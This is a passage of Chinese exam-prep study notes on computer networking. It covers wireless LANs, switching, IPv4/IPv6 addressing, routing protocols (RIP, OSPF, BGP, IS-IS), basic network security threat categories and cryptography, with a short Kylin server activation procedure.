子层定义了 3 种访问控制机制。 CSMA/CA（载波侦听/冲突避免）分布式协调功能:大家争用访问(有竞争)。能够解决隐蔽终端和暴露终端问题。（CSMA/CD 只能检测） RTS/CTS 信道预约:要发送先打报告，其他终端记录信道占用时间。 PCF点协调功能:由 AP 集中轮询所有终端，将发送权限轮流交给各个终端类似令牌(无竞争)。 <span class="hljs-comment"># 802.11 三种帧间间隔 </span>IFS(分布式协调 IFS):最长的 IFS，优先级最低，用于异步帧竞争访问的时延。 PIFS(点协调 IFS):中等长度的 IFS，优先级居中，在 PCF 操作中使用。 SIFS(短 IFS):最短的 IFS，优先级最高，用于需要立即响应的操作(确认 ACK)。<span class="hljs-comment"># 移动 AD Hoc 网络</span>802.11 定义 AD Hoc 网络是由无线移动节点组成的对等网，无需网络基础设设施的支持，每个节点既是主机，又是路由器是一种 MANNET(MobileAd Hoc Network)网络。 Ad Hoc 是拉丁语具有”即兴，临时”的意思<span class="hljs-comment"># MANET 网络特点</span>网络拓扑结构动态变化的，不能使用传统路由协议。 无线信道提供的带宽较小，信号衰落和噪声干扰的影响却很大 无线终端携带的电源能量有限。 容易招致网络窃听、欺骗、拒绝服务等恶意攻击的威胁。<span class="hljs-comment"># WLAN 安全机制</span>(1)SSID 访问控制:隐藏 SSID，让不知道的人搜索不到。 (2)物理地址过滤:在无线路由器设置 MAC 地址黑白名单。 (3)WEP 认证和加密:PSK 预共享密钥认证，RC4 加密。 (4)WPA(802.11i 草案)认证:802.1x 加密:RC4(增强)+TKIP(临时密钥完整协议，动态改变密钥)支持完整性认证和防重放攻击。 (5)WPA2(802.11i)针对 WPA 优化，加密协议是由 RC4 变为基于 AES 的 CCMP，安全性更高。 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523162213342.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 交换机的寻址： </span>~~初始情况下，交换机 MAC 地址表是空的。 ~~PC1 发送一个数据帧给 PC4 假设 PC1 已经知道 PC4 的 MAC 地址。 ~~交换机在收到数据帧后，将数据帧的源 MAC 地址上学习到 MAC 地址表中，并与接收该帧的接口 GE0/0/1 口关联。 ~~交换机在 MAC 地址表中查询数据帧的目的 MAC 地址，发现没有匹配的表项，因此将数据帧从除入站接口之外的所有接口泛洪出去。 ~~PC2 及 PC3 收到数据帧后将其丢弃，因为这些数据帧并非发送给自己;PC4 则收下数据帧现在 PC4 要回复数据给 PC1。 ~~PC4 封装回复包，发给 PC1。 ~~交换机收到了 PC4 的数据帧，将帧头中的源 MAC 地址学习到 MAC 表中，并与接口GE0/0/4 关联。 ~~交换机在 MAC 表中查找数据帧的目的 MAC 地址，发现有一个匹配的表项，出接口是GE0/0/1，于是将数据帧转发到 GE0/0/1 口。 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523162333300.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523162356759.png" alt="img"></p><pre><code class="hljs bash">网关是互连网络中操作在 OSI 传输层之上的设施。 网关的主要功能: (1)连接网络层之上执行不同协议的子网，组成异构型的互联网。 (2)网关能对互不兼容的高层协议进行转换 (3)为了实现异构型设备之间的通信，网关要要对不同传输层、会话层、表示层、应用层协议进行翻译和转换 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523162426982.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 网络演进总结 </span>(1)交换机前身:中继器、集线器 (2)二层交换机:基于 MAC 转发 (3)三层交换机:集成路由功能 (4)多业务交换机:FW/AC/LB/WS (5)可编程交换机:SDN <span class="hljs-comment"># IPv4 报文格式</span>头部长度(IHL):最小值是 5，最大值为 15，单位 4 字节。 TOS:为区分服务字段，用区分服务类型，即 QoS 字段。 总长度字段:IPv4 数据报的总长度。 标识:主机发送 IP 报文的序号，每发送一次+1。 生存期(TTL):用于设置一个数据包可经过的路由器数量的上限，每经过一台路由器减 1。 协议字段:包含一个数字，标识数据报有效载荷部分的数据类型。最常用的值为1(ICMP)17(UDP)和 6(TCP)。头部校验和:仅计算 IPv4 头部，不检查数据有效载荷部分的正确性。当 TTL 减一时，头部校验和必须重新计算。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523162539695.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523162608403.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 特殊 IPv4 地址 </span>1. 0.0.0.0 主机端:DHCP 分配过程中，用 0.0.0.0 表示本机，比如主机 DHCP Discover 广播报文源目地址和端口是 0.0.0.0:68 -&gt; 255.255.255.255:67 服务器端:0.0.0.0 本机所有 IPv4 地址，如果某主机有两个 IP 地址，一个服务临听的地址是0.0.0.0，那么通过两个 IP 地址都能够访问该服务 路由:0.0.0.0 表示默认路由，即当路由表中没有找到完全匹配路由的时候所对应的路由。2. 255.255.255.255 受限广播地址，表示 3 层广播的目标地址，在同一个广播域范围内所有主机都会接收这个包，广播域的范围可变，跟子网划分相关。 3. 169.254.0.0/16 使用 DHCP 自动获取 IP 地址，当 DHCP 服务器发生故障，或响应时间超时系统会为你分配这样一个地址，不能正常上网。 4.127.0.0.0/8 ( 127.0.0.1-127.255.255.255)。 本地环回地址，能 ping 通 127 地址，证明 TCP/IP 协议栈正常。 5.RFC1918 私有 IP 地址 IPv4 地址空间中有一部分特殊的地址，成为私有 IP 地址，私有 IP 地址不能直接访问公网(Internet)的 IP，只能在本地使用。 A 类:10.0.0.0/8 (10.0.0.1-10.255.255.255)1 个 A 类网络。 B 类:172.16.0.0/12(172.16.0.1-172.31.255.255)16 个 B 类网络 C 类:192.168.0.0/16(192.168.0.1-192.168.255.255)256 个 C 类网络 6.常见组播: 224.0.0.1 所有主机 224.0.0.2 所有路由器 224.0.0.5 所有运行 OSPF 的路由器 224.0.0.6 DR 和 BDR 的组播接收地址 224.0.0.9 RIPy2 组播更新地址 224.0.0.18 VRRP 组播地址 为什么要进行子网划分？ (1)标准主类网络划分，造成 IP 地址空间浪费 (2)广播域中 PC 数量过多，广播风暴会消耗网络资源 IP 子网划分和 VLAN 的关系? 都是隔离技术，子网划分是针对 IP( 网络层)，VLAN 是针对以太网( 数据链路层)。 一般 VLAN 与子网对应，每个子网主机数量建议为一个 C 类地址，即 254 台主机，最大不超过 4 个 C，即 1000 台。 <span class="hljs-comment"># 子网划分原理——网络位向主机位借位，从而使得网络部分的位数加长，借用的位表示子网位。如果借用 1 位，则可以划分为 21=2 个子网，借用 2 位可以划分为 22=4 个子网，借用3 位，可以划分为 23=8 个子网。</span><span class="hljs-comment"># ARP 工作过程 </span>①主机 A 查询自己的 ARP 缓存，发现没有主机 B 对应的 MAC 地址 ②主机 A 发送 ARP Request 报文(广播); ③主机 B 把主机 A 的 IP、MAC 对应信息填入自己的 ARP 缓存中 ④主机 B 向主机 A 回送包含主机 B 的 MAC 地址的 ARP Reply 报文(单播)G ⑤主机 A 收到主机 B 的 ARP Replay 报文，将主机 B 的 IP 和 MAC 对应关系填入自己的 ARP <span class="hljs-comment"># ICMP(Interneet Control Message Protocol，Internet 控制到报文协议)，协议号为为 1，封装在 IP 报文中，用来传递差错、控制、查询等信息息，典型应用 ping/tracert 依赖 ICMP 报文。</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523162923747.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523163012206.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523163053393.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523163113473.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># TCP 流量控制:为了防止发送方发送速度过快，导致接收方处理不过来，造成丢包重传，浪费网络资源。 在 AB 两个端点进行</span>TCP 流量控制机制: 可变大小的滑动窗口。 TCP 滑动窗口机制，窗口大小决定了在收到确认前可以发送的数据量<span class="hljs-comment"># 滑动窗口:是 TCP 的流控措施，接收方通过通告发送方自己的可以接受缓冲区大小，从而控制发送方的发送速度。 作用于收发两端设备</span><span class="hljs-comment"># 拥塞窗口( cwnd) : TCP 拥塞控制措施，发送方维持一个( congestion window )的状态变量。~~拥塞窗口的大小取决于网络的拥塞程度，并且动态、地在变化，发送方让自己的发送窗口等于拥塞。作用于网络线路之中 </span>~~TCP 首部的窗口是指滑动窗口，拥塞窗口( cwnd)的值存放在本地<span class="hljs-comment"># TCP/UDP 端口号 </span>. 源端口随机分配，目标端口使用知名端口。 . 应用客户端使用的源端口一般为系统中未使用的但是大于 1024 的随机端口。 . 目的端口号为服务器端应用服务器的进程，如 telnet 为 23 传输层主要有两个协议，TCP 和 UDP，区别如下：</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523163333851.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 路由（Routing）是通过互联的网络把信息从源地址传输到目的地址的活动。</span>~~当路由器(或真他三层设备)收到一个 IP 数据包时，会查看数据包的 IP 头部中的目的 IP 地址，并在路由表中进行查找，在匹配到最优的路由后，将数据包扔给该路由所指出接口或者下一跳。<span class="hljs-comment"># 路由器工作原理 建立并维护路由表 RIB。根据路由表进行数据转发。 </span>◆直连路由: 路由器本地接口所在网段。◆静态路由: 手工配置的路由条目。◆动态路由: 路由器之间通过动态路由协议学习到的路由。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523163501589.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 路由的优先级 </span>DIRECT——0 OSPF——10 IS-IS——15 STATIC——60 RIP——100 OSPF AS E——150 OSPF NSSA——150 IBGP——255 EBGP——255 <span class="hljs-comment"># </span>静态路由的配置(关联下一跳 IP 的方式) [Router] ip route-static 网络号掩码下一跳 IP 地址 静态路由的配置(关联出接口的方式) [Router] ip route-static 网络号掩码出接口 · 静态路由的配置(关联出接口和下一跳 IP 的方式) [Router] ip route-static 网络号掩码出接口下一跳 IP 地址     . 通信是双向的，因此要留意往返流量(的路由)     . 路由行为是逐跳的，因此需要保证沿途每一台路由器都高路由 <span class="hljs-comment"># 静态路由与默认路由特点</span>默认路由——（ip route-static 0.0.0.0 0 192.168.1.1）是特殊的静态路由，走投无路的选择，配置简单，简化管理降低路由器 CPU、内存资源。用处:网络出口路由器/防火墙/核心交换机。 静态路由——配置简单，手工配置，可控性高，节省网络带宽，若网络大工作量就很大，网络故障，无法响应拓扑动态变化 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523163838409.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523163923481.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523163943202.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 距离矢量路由协议 </span>    使用距离矢量路由协议的路由器并不了解网络的拓扑。该路由器只知道:自身与目的网络之间的距离。应该往哪个方向或哪个接口转发数据包。周期性地更新(广播)整张路由表。<span class="hljs-comment"># RIP 防环机制</span>    ①最大跳数:当一个路由条目发送出去会自加 1 跳，跳数最大为 16 跳，意昧着不可达。     ②水平分割:一条路由信息不会发送给信息的来源。     ③反向毒化:把从邻居学习到的路由信息设为 16 跳，再发送给那个邻居。     ④抑制定时器和触发更新也可以防止环路。<span class="hljs-comment"># OSPF 简介 . Open Shortest Path First I 开放式最短路径优先协议内部网关协议， OSPF 是一种链路状态路由协议。 </span>    Open 意昧着公布，任何厂商都能支撑 OSPF I 目前业内使用最广泛的 IGP。     华为设备上， OSPF 协议优先级 Internal 10 I External 150。     路由器之间交互的是链路状态信息，而不是直接交互路由。     路由器知晓网络拓扑结构，采用 SPF 算法(迪杰斯特拉 Dijkstra )计算达到目的地的最短路径。支持 VLSM，支持手工路由汇总。 <span class="hljs-comment"># OSPF 基本特点 适应范围广:支持各种规模的网络。</span>. 快速收敛:在网络的拓扑结构发生变化后立即发送更新报文，使该变化在自治系统中同步。 . 无自环:使用 SPF 最短路径树算法进行路由计算，不会产生环路。 . 区域划分: 允许网络被划分成区域来管理，链路状态数据库仅需和区域内真他路由器保持一致。减小对路由器内存和 CPU 的消耗。同时区域间传送的路由信息减小，降低网络带宽占用。· 所有非骨干区域必须与骨干区域直连。 <span class="hljs-comment"># OSPF Cost</span>. OSPF 使用 Cost 11 开销<span class="hljs-string">&quot;作为路由度量值。 </span><span class="hljs-string">. OSPF 接口 cost=100M/接口带宽，其中 100M 为参考带宽(reference-bandwidth)可修改。 </span><span class="hljs-string">. 每一个激活 OSPF 的接口都有一个 cost 值。 </span><span class="hljs-string">. 一条 OSPF 路由的 cost 是该路由从起源一直到达本地的所有入接口 cost 值的总和。</span><span class="hljs-string">区域内路由器 IR( Internal Router) 区域边界路由器 ABR ( Area Border Router) </span><span class="hljs-string">骨干路由器 BR(Backbone Router) AS 边界路由器 ASBR (AS Boundary Router) </span><span class="hljs-string"></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523165636772.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># DR 和 BDR 维护大量邻居关系需要耗费设备资源，同时为了减少多路访问网络中的 OSPF 流量，OSPF 会在每一个 Ma 网络(多路访问网络)选举一个指定路由器(DR)和一个备用指定路由器( BDR)。 </span>DR 选举规则:最高 OSPF 接口优先级拥有者被选为 DR，如果优先级相等(默认为 1)，具有最高 OSPFRouterID 的路由器被选举为 DR，并且 DR 具有非抢占性。[优先级 0 不参与选举备用指定路由器(BDR):监控 DR 状态，并在当前 DR 发生故障后接替其角色 OSPF 总结 ·触发式更新、分层路由，支持大型网络。Area 0 来表示骨干区域，不是区域 1。· 点对点网络上每 10 秒发送一次 hello I 在 NBMA 网络每 30 秒发送一次 I Deadtime 为 hello时间 4 倍。 OSPF 系统内几个特殊组播地址: . 224.0.0.1 一在本地子网的所高主机。 . 224.0.0.2 一在本地子网的所高路由器。 . 224.0.0.5-运行 OSPF 协议的路由器。 . 224.0.0.6 -OSPF 指定/备用指定路由器 DR/BDR。 ·目标地址 224.0.0.5 指所有路由器，用于发现建立邻居、还用于选出区域内的指定路由器 DR 末日备份指定路由器 BDR ( DR/BDR 组播地址是 224.0.0.6)。 <span class="hljs-comment"># OSPF Router-id 需要注意以下几点:</span>① Router-ID 用于在 OSPF 域中唯一地表示一台 OSPF 路由器，从 OSPF 网络设计的角度，我们要求全 OSPF 域内，禁止出现两台路由器拥再相同的 RouterID。 ② Router-ID 可以通过手工配置的方式，也可以自动选取。实际网络部署中，强烈建议手工配置 OSPF Router-ID ，因为这关系到协议的稳定。一般会配置为环回测试接口的 IP 地址。③在路由器运行了 OSPF 并由系统自动选定 Router-ID 之后，如果该 Router-ID 对应的接口 DOWN 掉，或出现一个更大的 IP , OSPF 仍然保持原 Router-ID(也就是说， Router-ID值是非抢占的，稳定第一)，即使此时 reset ospf process 重启 OSPF 进程， Router-ID 也不会发生改变;除非重新手工配置 Router-ID ( OSPF 进程下手工敲 router-id xxx) ，并且重启 OSPF 进程万可。 ④如果该 Router-ID 对应的接口 IP 地址消失，例如 undo ip address ，贝 Ureset ospf process 后， RouterID 也会发生改变。 <span class="hljs-comment"># OSPF 的 router-id 选举规则如下: </span>( 1 )优选手工配置的 router-id。     ①OSPF 进程手工配置的 router-id 具有最高优先级(不能配置为 255.255.255.255 手动O.O.O.O )     ②在全局模式下配置的公用 router-id 的优先级仅次于直接给 OSPF 进程手工自己置 router-id，即它具有第二优先级。 ( 2 )在没有手工配置的前提下，优选 loopback 接口地址中最大的地址作为 router-id。 ( 3 )在没有配置 loopback 接口地址的前提下，优选其他接口的 IP 地址中选择最大的地址作为 router -<span class="hljs-built_in">id</span> (不考虑接口的 Up/Down 状态)。 在路由器运行了 OSPF 并由系统自动选定 router-id 之后，如果该 router-id 对应的接口 DOWN 掉，或出现一个更大的 IP , OSPF 仍然保持原 router-id。也就是说， router-id 值是非抢占的，稳定第一。即使此时 reset ospf process 重启 OSPF 进程， router-id 也不会发生改变。除非重新手工配置 router-id ( OSPF 进程下手工敲 router-id xxx) ，并且重启 OSPF进程方可。BGP ( Border Gateway Protocol I 边界网关协议)外部网关协议，用于不同自治系统 AS 之间，寻找最佳路由。 · 通过 TCP 179 端口建立连接。支持 VLSM 和 CIDR，是一种路径矢量协议。目前最新版本是 BGP4 +而 BGP4+支持 IPV6。 . Open 建立邻居关系，Keepalive 周期性探测邻居存活。每一个自治系统要选择至少一个路由器作为该自治系统的 <span class="hljs-string">&quot;BGP 发言人&quot;</span>。支持增量更新，支持认证。可靠传输，防止环路。自治通信，策略选路。支持无类、支持聚合。 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523170141897.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># BGP 选路规则 </span>.①丢弃下一跳不可达的路由。·②优选 Preference Value 最高的路由(私再属性，仅本地高效)。 .③优选 Local Preference 最高的路由。 · .④优选手动聚合&gt;自动聚合&gt; network &gt; import &gt;从对等体学到的。 .⑤优选 AS Path 最短的路由。 ·⑤起源类型 IGP &gt; EGP &gt; Incomplete。 · .⑦对于来自同-AS 的路由，优选 MED 最小的。 .⑧优选从 EBGP 学来的路由( EBGP &gt; IBGP)。 .⑨优选 AS 内部 IGP 的 Metric 最小的路由。 ·⑩优选 Cluster List 最短的路由。 · .⑾优选 Orginator_ID 最小的路由。 ·⑿优选 Router ID 最小的路由器发布的路由。 .⒀优选 IP 地址最小的邻居学来的路由。<span class="hljs-comment"># IS-IS ( Intermediate system to intermediate system I 中间系统到中间系统)是内部网关协议，</span>是电信运营商普遍采用的内部网关协议之一，也是一个分级的链路状态路由协议。与 OSPF 相似，它也使用 Hello 协议寻找毗邻节点。 与大多数路由协议不同 ，IS-IS 直接运行于链路层之上。. IS-IS 层次：分为两层 Level-1 和 Level-2。. Level-l ( L1 )是普通区域(Area) , Level-2 ( L2 )是骨干区 (Backbone)。 · 骨干区 Backbone 是连续的 Level-2 路由器的集合，由所有的 L2(含 L1/L2)路由器组成，Ll 和 L2 运行相同的 SPF 算法，一个路由器可能同时参与 L1 和 L2。 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523170351257.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># IPv4 问题与改进 </span>·网络地址短缺: IPv4 为 32 位，只能提供 43 亿个地址 ，IPv6 为 128 位。 ·地址分配不合理: IPv4 中 1/3 被美国占用， IBM 等大型企业地址比很多国家都多。 .路由速度慢:随着网络规模扩大，路由表越来越庞大，路由查找速度越来越慢。 IPv4 头部多达 13 个字段 IPv6 只高 8 个字段。 ·缺乏安全功能: IPv4 没有加密、认证等机制，IPv6 集成 IPSec 功能。 .不支持新的业务模式: IPv4 没有扩展字段 ，IPv6 支持多报头嵌套。 .IPv6 只能由源发节点进行分段，中间路由器不能分段，目的是简化路由 MTU 发现。<span class="hljs-comment"># </span><span class="hljs-comment"># IPv6 报文格式 </span>. 版本 (4 位):用 0110 表示 IPv6。 . 通信类型/流量等级( 8 位):用于区分不同的 IP 分组，相当于 IPv4 中服务类型字段。 . 流标签( 20 位):标识某些需要特别处理的分组。 . 负载长度( 16 位):表示除了 IPv6 固定头部 40 个字节之外的负载长度，扩展头包含在负载长度之中。 . 下一头部( 8 位):指明下一个头部类型，可能是 IPv6 扩展头部或高层协议的头部。 . 跳数限制( 8 位):用于检测路由循环，类似 TTL。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523170514259.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># IPv6 地址基础 </span>. IPv6 地 址 128 位 ， 采 用 冒 号 分 隔 的 十 六 进 制 数 ( 8 组 ) 表 示 。 . 例 如 : 8000: 0000:0000:0000 :0123:4567:89AB:CDEF。 · .每个字段前面的 O 可以省去，例如 0123 可以简写为 123。 .一个或多个全 0 字段，可以用一对冒号气<span class="hljs-string">&quot;代替 </span><span class="hljs-string">.高效 0 位不可以简写，双冒号只能出现一次。 </span><span class="hljs-string">·以上地址可简写为 8000 :: 123:4567:89AB:CDEF </span><span class="hljs-string">.IPv4 兼容地址可以写为 ::192.168.10.1</span><span class="hljs-string"></span><span class="hljs-string"># IPv6 地址分类 </span><span class="hljs-string">·单播地址可聚合全球单播地址:这种地址在全球范围内有效，相当于 IPv4 公用地址(前缀为 001)。 </span><span class="hljs-string">. 链路本地地址:用于同一链路的相邻节点间的通信(前缀为 11111110 10 )结合 MAC地址自动生成。 </span><span class="hljs-string">. 站点本地地址:相当于 IPv4 中的私网地址(前缀为 11111110 11 )。 【助记 :1 聚2 恋 3 占】 </span><span class="hljs-string">·组播地址 IPv6 中没有广播地址，广播功能被组播代替。 </span><span class="hljs-string">    IPv6 组播地址的格式前缀为 11111111，即 FF00 开头。 </span><span class="hljs-string">.任意播地址表示一组接口的标识符，通常是路由距离最近的接口。 </span><span class="hljs-string">    任意播地址不能用作源地址，而只能作为目标地址。 </span><span class="hljs-string">    任意播地址不能指定给 IPv6 主机，只能指定给 IPv6 路由器。 </span><span class="hljs-string"></span><span class="hljs-string">IPv6 地址书写 合法写法 12AB:0000:0000:CD30:0000:0000:0000:0000/60 </span><span class="hljs-string">12AB::CD30:0:0:0:0/60 12AB:0:0:C D 30::/60 </span><span class="hljs-string">非法写法 · </span><span class="hljs-string">12AB:0:0:CD3/60 (在 16 位的字段中可以省掉前面的 0，但不能省掉后面的 0) </span><span class="hljs-string">12AB::CD3/60 (这种表示可展开为 12AB:0000:0000:0000:0000:0000:0000:OCD3) </span><span class="hljs-string">12AB::CD30/ 60 (这种表示可展开为 12A B :0000 :0000 :0000 :0000 :0000 :0000: C D 3 0) </span><span class="hljs-string"></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523170739879.png" alt="img"></p><pre><code class="hljs bash">IPv6 路由协议 . RIPng、 OSPFv3、 BGP4+ .  DHCPv6 有状态自动配置: 直接分配前缀和接口 ID、网关和 DNS 等。(给全部信息) · DHCPv6 无状态自动配置: 路由器接口前缀+终端 EUI-64o(给一半信息) ICMPv6 :新增加的邻居发现功能代替了 ARP 协议的功能。IPv4 到 IPv6 过渡技术 双樵技术:同时运行 IPv4 和 IPv6。 · 隧道技术:解决 IPv6 节点之间通过 IPv4 网络进行通信。 翻译技术:解决纯 IPv6 节点与纯 IPv4 节点之间进行通信。 . 隧道: 6over4 没实际应用; ISATAP 自动隧道技术可以穿透 NAT 设备，与私网之外的主机建立 IPv6 连接 . 地址翻译: NAT -PT 实现纯 IPv6 节点与纯 IPv4 节点间的通信。 静态 NAT-PT 1:1 动态 NAT –PT M:N 基于端口 NAPT-PT M:1 网络安全威胁类型 . (1)窃听:例如搭线窃听、安装通信监视器和读取网上的信息等。 . (2)假冒:当一个实体假扮成另一个实体进行网络活动时就发生了假冒。 . (3)重放:重复发送一份报文或报文的一部分，以便产生一个被授权效果。(随机数、时间戳) . (4)流量分析:对网上信息流观察和分析推断出网上传输的有用信息。 . (5)数据完整性破坏:有意或无意地修改或破坏信息系统，或者在非授权和不能监测的方式下对数据进行修改。 . (6)拒绝服务 DOS :当一个授权实体不能获得应有的对网络资源的访问。 SYN-Flooding . (7)资源的非授权使用:即与所定义的安全策略不一致的使用。 . (8)陷门和特洛伊木马:通过替换系统合法程序，或者在合法程序里插入恶意代码。 . (9)病毒:随着人们对计算机系统和网络依赖程度的增加，计算机病毒己经构成了对计算机系统和网络的严重威胁。 . (10)诽谤:利用计算机信息系统的广泛互连性和匿名性散布错误的消息，以达到诋毁某个对象的形象和知名度的目的。 网络攻击分类 被动攻击:典型代表嗅探、监听和流量分析，最难被检测，重点是预防，主要手段是加密。 ·主动攻击:假冒、重放、欺骗、消息篡改和拒绝服务等，重点是检测而不是预防，手段有防火墙、 IDS 等技术 。· 主动攻击会破坏原本的传输内容或过程，被动攻击是窃听和分析物理临近攻击:防止外人乱进机房。·内部人员攻击:内鬼渗透，国共抗战，内部瓦解。 · 分发攻击:软件开发出来未安装之前，被篡改。(疫苗运输恒温不合格) 基本安全技术:数据加密\数字签名、身份认证、防火墙、入侵检测、内容检查。 私钥密码/对称密码，该体制的特点是加密和解密使用相同的密钥。消息的收发双方必须事先通过安全渠道交换密钥。 优点:加解密速度快、密文紧凑、使用长密钥时难破解。 缺点:密钥分配问题、密钥管理问题、无法认证源。 常见的对称密钥加密算法如下: DES、 3DES、 AES、 RC4/5、 IDEA。 公钥密码/非对称加密 对数据的加密和解密使用不同的密钥优点:密钥分发方便、密钥保管量少、支持数字签名。缺点:加密速度慢(计算量大，不适合加密大数据)、数据膨胀率高。 · 每个实体育两个密钥: 公钥公开，私钥自己保存。 · 公钥加密，私钥解密，可实现保密通信 . 私钥加密，公钥解密，可实现数字签名</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523171110739.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 混合密码:</span>发送方用对称密钥加密需要发送的消息，再用接收方的公钥加密对称密钥，然后一起发送给接收方，接收方先用自己的私钥解密得到对称密钥，再用对称密钥解密得到明文。<span class="hljs-comment"># 国产加密算法——SM 系列</span>是指由国家密码研究相关机构自主研发，具有相关知识产权的商用密码算法，目前己经公布的国产密码算法如下:（2 非 3 杂 14 对） </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523171236551.png" alt="img"></p><pre><code class="hljs bash">. 实体认证:识别通信双方的身份，防止假冒，可以使用数字签名 RSA . 消息认证:验证消息在传送或存储过程中有没有被篡改，通常使用报文摘要方法 M D5 . 基于共享密钥的认证:通信双方高一个共享的密钥，依赖双方都信任的密钥分发中心 KDC没有序列号，没有时间戳，容易被重放攻击 . 基于公钥的认证:通信双方都用对方的公钥加密，用各自的私钥解密。 . 哈希算法 HASH，又称为杂凑函数、散列函数，它能够将任意长度的信息转换成固定长度的哈希值(数字摘要 ) ，并且任意不同消息或文件所生成的哈希值是不一样的。 . h 表示 <span class="hljs-built_in">hash</span> 函数，则 h 满足下列条件: . (1) h 的输入可以是任意长度的消息或文件 M。 . (2) h 的输出的长度是固定的。 . (3)给定 h 末日 M，计算 h ( M )是容易的。 . (4)给定 h 的描述，找两个不同的消息 M1 和 M2，使得 h ( M1 ) =h ( M2 )是不可能的。 · 哈希函数特性:不可逆性(单向)、无碰撞性、雪崩效应。 常见的 Hash 算法有: . (1) MD5 算法:以 512 位数据块为单位来处理输入，产生 128 位的信息摘要。常用于文件校验。 . (2) SHA 算法:以 512 位数据块为单位来处理输入，产生 160 位的哈希值，具有比 MD5更强的安全性。 . (3) SM3 国产算法 :消息分组长度为 512 比特，输出 256 位摘要。 数字证书与身份证类比：包含所有者公钥信息和认证机构的数字签名</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523171427317.png" alt="img"></p><pre><code class="hljs bash">哈希应用：文件完整性校验，账号密码存储，用户身份认证 数字签名：签名方用自己的私钥进行签名，对方收到后，用签名方的公钥进行验证。数字签名算法(公钥加密算法) : RSA、 Rabin、 ELGamal 签名体制和 DSS 标准。数据签名是用于确认发送者身份和消息完整性的一个加密消息摘要，具有如下特点: ( 1 )数字签名是可信的。 ( 2 )数字签名不可伪造。 ( 3 )数字签名不能重新使用。 ( 4 )签名文件是不能改变的。 ( 5 )数字签名不能抵赖。 ( 6 )接收者能够核实发送者身份 </code></pre><ol><li>登录麒麟服务器系统的终端输入：kylin-system-verify 回车您就可以看到激活二维码了。</li><li>打开麒麟软件客服，点击右下角的 “扫描二维码”扫描服务器系统显示的二维码</li><li>输入服务序列号就可以得到 激活码了</li><li>在服务器上输入服务序列号 + 激活码即可激活。</li><li>查看当前激活状态：kylin_activation_check</li></ol><h3 id="广域网与接入网技术-（2～3）"><a href="#广域网与接入网技术-（2～3）" class="headerlink" title="广域网与接入网技术 （2～3）"></a>广域网与接入网技术 （2～3）</h3><blockquote><p>例如：HDLC、PPP、SONET&#x2F;SDH标准、PON、xDSL、HFC、数据交换类型</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523145930712.png" alt="img"></p><pre><code class="hljs bash">电路交换：ADSL，电话 报文交换：电报 分组交换：IP，FR，ATM，X.25分组交换优势：   1、减小了延迟，提高了吞吐量。                 2、可以按分组纠错，发现错误只需重发出错的分组，通信效率提高。  </code></pre><h3 id="局域网技术-（6～10）"><a href="#局域网技术-（6～10）" class="headerlink" title="局域网技术 （6～10）"></a>局域网技术 （6～10）</h3><blockquote><p>例如：IEEE 802标准、以太网技术、以太网交换机原理、STP、无线局域网、VLAN、GVRP、综合布线系统、传输介质</p></blockquote><h3 id="网络互联与因特网技术-（20-25）"><a href="#网络互联与因特网技术-（20-25）" class="headerlink" title="网络互联与因特网技术 （20~25）"></a>网络互联与因特网技术 （20~25）</h3><blockquote><p>例如：IPv4协议地址、ARP、ICMP、IPv6协议、TCP、UDP、QOS、路由基础概念、路由器基本配置、动态路由协议、ACL、NAT、Web、DNS、DHCP、FTP、HTTP、Telnet、电子邮件、网络新技术</p></blockquote><h3 id="系统与网络安全基础-（5～8）"><a href="#系统与网络安全基础-（5～8）" class="headerlink" title="系统与网络安全基础 （5～8）"></a>系统与网络安全基础 